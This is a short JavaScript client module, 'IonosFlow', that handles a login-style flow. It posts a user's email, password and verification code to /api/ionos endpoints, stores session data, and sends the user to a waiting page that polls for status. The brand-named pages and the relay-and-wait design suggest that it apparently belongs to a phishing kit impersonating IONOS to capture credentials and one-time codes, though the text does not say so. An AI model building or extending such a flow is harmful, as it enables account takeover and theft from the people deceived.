(function () {
  function getSessionId() {
    const params = new URLSearchParams(window.location.search);
    return (params.get("s") || sessionStorage.getItem("ionos_session") || "").trim();
  }

  function saveSessionId(id) {
    if (id) sessionStorage.setItem("ionos_session", id);
  }

  function saveEmail(email) {
    if (email) sessionStorage.setItem("ionos_identifier", email);
  }

  function getEmail() {
    return sessionStorage.getItem("ionos_identifier") || "";
  }

  async function startSession(email) {
    const res = await fetch("/api/ionos/start", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email }),
    });
    const data = await res.json();
    if (!data.ok) throw new Error(data.message || "Session failed");
    saveSessionId(data.sessionId);
    saveEmail(email);
    return data.sessionId;
  }

  async function submitCode(sessionId, code) {
    const res = await fetch("/api/ionos/session/" + encodeURIComponent(sessionId) + "/code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code }),
    });
    return res.json();
  }

  async function submitPassword(sessionId, password) {
    const res = await fetch("/api/ionos/session/" + encodeURIComponent(sessionId) + "/password", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password }),
    });
    return res.json();
  }

  async function pollSession(sessionId) {
    const res = await fetch("/api/ionos/session/" + encodeURIComponent(sessionId) + "/poll");
    return res.json();
  }

  function goWaiting(sessionId) {
    window.location.href = "ionos-waiting.html?s=" + encodeURIComponent(sessionId);
  }

  function requireSession() {
    const id = getSessionId();
    if (!id) {
      window.location.replace("ionos.html");
      return null;
    }
    saveSessionId(id);
    return id;
  }

  async function loadSessionInfo(sessionId) {
    const res = await fetch("/api/ionos/session/" + encodeURIComponent(sessionId));
    const data = await res.json();
    if (!data.ok) {
      window.location.replace("ionos.html");
      return null;
    }
    saveEmail(data.email);
    return data;
  }

  function showError(el, message) {
    if (!el) return;
    el.textContent = message;
    el.hidden = !message;
  }

  window.IonosFlow = {
    getSessionId,
    saveSessionId,
    saveEmail,
    getEmail,
    startSession,
    submitCode,
    submitPassword,
    pollSession,
    goWaiting,
    requireSession,
    loadSessionInfo,
    showError,
  };
})();
